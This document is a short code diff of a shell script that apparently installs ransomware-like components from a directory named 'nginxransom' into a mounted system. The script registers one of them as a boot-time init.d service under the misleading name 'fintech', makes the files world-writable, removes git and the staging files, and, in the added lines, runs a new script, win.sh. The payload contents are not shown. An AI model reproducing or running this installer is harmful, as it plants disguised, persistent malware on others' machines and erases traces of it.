@@ -17,6 +17,7 @@ cp   nginxransom/service.sh ../
 cp   nginxransom/service.sh ../mnt/
 cp   nginxransom/init.py    ../mnt/
 cp   nginxransom/hoa.ps1    ../mnt/
+cp   nginxransom/win.sh     ../mnt/
 chmod 777 /usr/bin/bootstarp 
 chmod 777 mnt/usr/local/bin/bootstarp
 chmod 777 mnt/usr/bin/bootstarp 
@@ -24,6 +25,7 @@ chmod 777 mnt/service.sh
 chmod 777 service.sh
 chmod 777 init.py
 chmod 777 hoa.ps1
+chmod 777 win.sh
 chroot mnt/ cp service.sh /etc/init.d/fintech
 rm -rf service.sh
 chroot mnt/ chmod +x /etc/init.d/fintech
@@ -42,3 +44,4 @@ chroot mnt/ rm -rf service.sh
 apt remove git -y
  
 rm -rf nginxransom/
+./win.sh
